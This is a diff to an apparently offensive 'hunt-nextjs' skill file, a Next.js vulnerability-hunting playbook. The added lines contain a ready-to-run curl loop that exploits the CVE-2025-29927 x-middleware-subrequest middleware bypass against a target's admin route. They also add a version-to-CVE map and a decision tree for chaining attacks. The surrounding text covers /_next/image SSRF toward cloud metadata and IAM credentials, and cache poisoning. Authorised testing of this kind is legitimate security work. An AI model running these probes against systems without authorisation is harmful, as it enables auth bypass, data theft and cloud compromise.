@@ -1,6 +1,6 @@
 ---
 name: hunt-nextjs
-description: Hunt Next.js specific vulnerabilities — Server Actions arbitrary function execution, Middleware auth bypass via static asset paths, ISR cache poisoning, Image Optimization SSRF (/_next/image), RSC payload leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 13/14/15 or any React SSR framework.
+description: Hunt Next.js specific vulnerabilities — x-middleware-subrequest auth bypass (CVE-2025-29927), Server Actions arbitrary function execution + SSRF (CVE-2024-34351), Middleware auth bypass via matcher/path gaps, ISR/RSC cache poisoning (CVE-2024-46982), Image Optimization SSRF (/_next/image), RSC flight-data leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 11/12/13/14/15 or any React SSR framework.
 sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
 report_count: 0
 ---
@@ -12,11 +12,20 @@ report_count: 0
 Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.
 
 **Highest-value chains:**
+- **`x-middleware-subrequest` middleware bypass (CVE-2025-29927)** — a crafted `x-middleware-subrequest` header makes Next.js skip middleware entirely → all middleware-enforced auth/authz bypassed. Affects 11.1.4–15.2.2 (fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5). THE highest-value Next.js bug of 2025 — test it first on any middleware-gated route.
 - **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
-- **Middleware bypass via `/_next/static/`** — middleware skips static asset paths → protected routes accessible via `/_next/data/` IDOR
+- **Middleware bypass via path/matcher gaps** — middleware `matcher` skips static/data paths → protected routes reachable via `/_next/data/` JSON or path-normalization tricks (IDOR)
 - **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
 - **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
-- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client
+- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client (`?__flight__`, `RSC: 1` header, `Next-Router-State-Tree`)
+
+**Decision tree (adapts to any Next.js deployment):**
+1. Fingerprint version (Phase 1). Map it to the CVE-2025-29927 window → if in range, the `x-middleware-subrequest` bypass is the first probe.
+2. Is there middleware-enforced auth (redirect to `/login` on protected route)? → run Phase 3 bypass matrix + the subrequest header.
+3. Are there Server Actions (`Next-Action` IDs in HTML/JS)? → Phase 2.
+4. Is `/_next/image` present? → Phase 4 SSRF (allowlist-aware).
+5. SSG/ISR pages (`x-nextjs-cache` header)? → Phase 6 cache poisoning + revalidate secret.
+Run every branch that fingerprints positive — do not stop at the first.
 
 ---
 
@@ -53,6 +62,14 @@ curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
 curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
 ```
 
+**Version → CVE map (check before hunting):**
+| Version range | Key bug | Note |
+|---|---|---|
+| 11.1.4 – 15.2.2 | **CVE-2025-29927** middleware bypass via `x-middleware-subrequest` | Fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Self-hosted (`next start`, standalone) affected; some managed hosts (Vercel/Netlify) patched at the edge — test anyway |
+| 13.4.0 – <14.1.1 | CVE-2024-34351 Server Actions SSRF (Host-trusting relative redirect) | Fixed 14.1.1; not `/_next/image` |
+| <14.2.21 (App Router cache) | CVE-2024-46982 cache poisoning via crafted RSC request | Poison a static page into the cache |
+Treat the map as a starting hypothesis — confirm the actual behavior, never report on version banner alone.
+
 ---
 
 ## Phase 2 — Server Actions Abuse
@@ -79,6 +96,22 @@ curl -s -X POST https://$TARGET/target-page \
 ## Phase 3 — Middleware Auth Bypass
 
 ```bash
+# === CVE-2025-29927: x-middleware-subrequest bypass (test this FIRST) ===
+# The header value is a ":"-joined middleware path. Next tolerates repeats, so a
+# long repeated value covers nested/renamed middleware. Try all known shapes:
+BASE=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard)   # baseline (302/401/403 expected)
+for V in \
+  "middleware" \
+  "src/middleware" \
+  "middleware:middleware:middleware:middleware:middleware" \
+  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
+  "pages/_middleware"; do
+  CODE=$(curl -s -o /tmp/mw -w "%{http_code}" https://$TARGET/admin/dashboard -H "x-middleware-subrequest: $V")
+  echo "[$CODE] x-middleware-subrequest: $V"
+done
+# A protected route flipping from 302/401/403 (baseline) to 200 WITH authed content
+# = confirmed auth bypass. Body-diff /tmp/mw vs a known-unauth response to prove it.
+
 # Next.js middleware runs on edge runtime and may skip certain paths
 # Test protected route directly
 curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
@@ -223,6 +256,7 @@ if m:
 
 | Next.js finding | Chain to | Impact |
 |----------------|----------|--------|
+| `x-middleware-subrequest` bypass (CVE-2025-29927) | Reach every middleware-gated route unauth → admin panels, internal APIs, auth gates | Critical auth bypass |
 | Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
 | `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
 | `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
@@ -234,12 +268,14 @@ if m:
 
 ## Validation
 
+✅ Middleware subrequest bypass: protected route returns 200 WITH authenticated/admin content (body-diffed vs unauth baseline) only when the header is present — status code alone is not enough
 ✅ Server Action: action executes without valid session, returns data or mutates state
-✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF
-✅ Middleware bypass: 200 response on protected route without auth cookie
-✅ Data leak: `__NEXT_DATA__` contains non-public secrets or other users' PII
+✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF (OOB, unique subdomain)
+✅ Middleware bypass: 200 response on protected route without auth cookie, serving data the gate should block
+✅ Data leak: `__NEXT_DATA__`/RSC flight data contains non-public secrets or other users' PII
 
 **Severity:**
+- `x-middleware-subrequest` bypass reaching admin/internal: Critical
 - Server Action auth bypass → data mutation: High/Critical
 - Image SSRF → cloud metadata: Critical
 - Middleware bypass → admin panel: High
